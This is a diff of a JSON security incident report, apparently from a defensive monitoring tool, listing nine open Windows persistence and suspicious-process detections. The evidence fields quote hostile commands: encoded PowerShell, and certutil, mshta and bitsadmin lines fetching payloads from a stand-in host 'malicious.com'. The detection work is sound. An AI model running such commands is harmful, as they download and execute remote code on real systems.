@@ -1,10 +1,140 @@
 {
-  "timestamp": "2026-09-05T19:19:27.803348",
+  "timestamp": "2026-09-05T19:33:20.339357",
   "question": "Có sự cố gì cần xử lý?",
-  "total_incidents": 0,
-  "by_severity": {},
-  "by_status": {
-    "OPEN": 0
+  "total_incidents": 9,
+  "by_severity": {
+    "CRITICAL": 1,
+    "HIGH": 8
   },
-  "incidents": []
+  "by_status": {
+    "OPEN": 9
+  },
+  "incidents": [
+    {
+      "incident_id": "INC-0005",
+      "severity": "CRITICAL",
+      "status": "OPEN",
+      "title": "PERSISTENCE THREAT: WMI Event Consumer Subscription",
+      "description": "Persistence type: WMI Event Consumer Subscription",
+      "assets": [],
+      "evidence": [
+        "WMI Event Consumers",
+        "WMI Event Filters",
+        "Filter to Consumer Binding"
+      ],
+      "recommended_action": "Kiểm tra WMI event subscribers, xóa các subscriptions lạ",
+      "created_at": "2026-09-05T19:33:20.320976"
+    },
+    {
+      "incident_id": "INC-0001",
+      "severity": "HIGH",
+      "status": "OPEN",
+      "title": "Sự kiện nghi ngờ: Level Change",
+      "description": "Level Change",
+      "assets": [],
+      "evidence": [
+        "Mức rủi ro thay đổi: LOW → MEDIUM"
+      ],
+      "recommended_action": "Điều tra sự kiện",
+      "created_at": "2026-09-05T19:33:20.310941"
+    },
+    {
+      "incident_id": "INC-0002",
+      "severity": "HIGH",
+      "status": "OPEN",
+      "title": "PERSISTENCE THREAT: Registry Run Key Modification",
+      "description": "Persistence type: Registry Run Key Modification",
+      "assets": [],
+      "evidence": [
+        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+      ],
+      "recommended_action": "Kiểm tra registry run keys, xóa entries lạ",
+      "created_at": "2026-09-05T19:33:20.320976"
+    },
+    {
+      "incident_id": "INC-0003",
+      "severity": "HIGH",
+      "status": "OPEN",
+      "title": "PERSISTENCE THREAT: Startup Folder Persistence",
+      "description": "Persistence type: Startup Folder Persistence",
+      "assets": [],
+      "evidence": [
+        "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
+      ],
+      "recommended_action": "Kiểm tra Startup folders, xóa files lạ",
+      "created_at": "2026-09-05T19:33:20.320976"
+    },
+    {
+      "incident_id": "INC-0004",
+      "severity": "HIGH",
+      "status": "OPEN",
+      "title": "PERSISTENCE THREAT: Malicious Service",
+      "description": "Persistence type: Malicious Service",
+      "assets": [],
+      "evidence": [
+        "HKLM\\System\\CurrentControlSet\\Services\\",
+        "registry services entries"
+      ],
+      "recommended_action": "Kiểm tra services mới, xóa nếu lạ",
+      "created_at": "2026-09-05T19:33:20.320976"
+    },
+    {
+      "incident_id": "INC-0006",
+      "severity": "HIGH",
+      "status": "OPEN",
+      "title": "SUSPICIOUS PROCESS: PowerShell.exe",
+      "description": "Suspicious pattern: PowerShell Encoded",
+      "assets": [],
+      "evidence": [
+        "Process: PowerShell.exe",
+        "Command: powershell.exe -enc JABjAG8A..."
+      ],
+      "recommended_action": "Điều tra process PowerShell.exe, cân nhắc terminate nếu xác nhận malicious",
+      "created_at": "2026-09-05T19:33:20.339357"
+    },
+    {
+      "incident_id": "INC-0007",
+      "severity": "HIGH",
+      "status": "OPEN",
+      "title": "SUSPICIOUS PROCESS: certutil.exe",
+      "description": "Suspicious pattern: CertUtil Suspicious",
+      "assets": [],
+      "evidence": [
+        "Process: certutil.exe",
+        "Command: certutil.exe -urlcache -f http://malicious.com/file.exe"
+      ],
+      "recommended_action": "Điều tra process certutil.exe, cân nhắc terminate nếu xác nhận malicious",
+      "created_at": "2026-09-05T19:33:20.339357"
+    },
+    {
+      "incident_id": "INC-0008",
+      "severity": "HIGH",
+      "status": "OPEN",
+      "title": "SUSPICIOUS PROCESS: mshta.exe",
+      "description": "Suspicious pattern: Mshta Suspicious",
+      "assets": [],
+      "evidence": [
+        "Process: mshta.exe",
+        "Command: mshta.exe http://malicious.com/payload.hta"
+      ],
+      "recommended_action": "Điều tra process mshta.exe, cân nhắc terminate nếu xác nhận malicious",
+      "created_at": "2026-09-05T19:33:20.339357"
+    },
+    {
+      "incident_id": "INC-0009",
+      "severity": "HIGH",
+      "status": "OPEN",
+      "title": "SUSPICIOUS PROCESS: bitsadmin.exe",
+      "description": "Suspicious pattern: Living Off The Land",
+      "assets": [],
+      "evidence": [
+        "Process: bitsadmin.exe",
+        "Command: bitsadmin.exe /transfer job /download /resume http://malicious.com/file.exe"
+      ],
+      "recommended_action": "Điều tra process bitsadmin.exe, cân nhắc terminate nếu xác nhận malicious",
+      "created_at": "2026-09-05T19:33:20.339357"
+    }
+  ]
 }
